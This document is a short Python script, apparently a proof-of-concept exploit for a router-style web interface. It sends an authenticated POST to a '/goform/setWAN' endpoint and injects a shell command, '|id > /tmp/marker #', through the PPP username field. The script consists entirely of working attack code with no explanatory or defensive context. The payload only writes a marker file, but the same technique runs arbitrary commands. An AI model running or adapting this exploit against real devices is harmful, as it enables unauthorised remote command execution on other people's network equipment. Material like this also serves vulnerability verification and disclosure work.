import sys
import urllib.request
import urllib.parse
import base64

url = sys.argv[1].rstrip('/') + '/goform/setWAN'
body = urllib.parse.urlencode({
    'wanMode': '2',
    'pppUserName': '|id > /tmp/marker #',
    'submit-url': '/wan.asp',
}).encode('ascii')
request = urllib.request.Request(url, data=body, method='POST')
credential = base64.b64encode((sys.argv[2] + ':' + sys.argv[3]).encode()).decode()
request.add_header('Authorization', 'Basic ' + credential)
request.add_header('Content-Type', 'application/x-www-form-urlencoded')
with urllib.request.urlopen(request, timeout=5) as response:
    print(response.status)
